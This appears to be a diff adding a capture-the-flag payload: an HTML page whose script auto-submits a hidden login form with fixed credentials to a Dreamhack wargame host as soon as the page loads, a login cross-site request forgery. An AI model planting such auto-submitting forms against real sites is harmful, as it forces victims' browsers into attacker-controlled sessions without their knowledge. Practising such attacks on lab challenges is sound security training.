@@ -1,0 +1,12 @@
+<script>
+    // 페이지 로드 즉시 폼 자동 제출
+    window.onload = function() {
+        document.getElementById('loginForm').submit();
+    };
+</script>
+
+<form id="loginForm" method="POST" action="http://host3.dreamhack.games:15000/login">
+    <input type="hidden" name="username" value="ksil">
+    <input type="hidden" name="password" value="ksil">
+    <input type="submit" value="Login">
+</form>
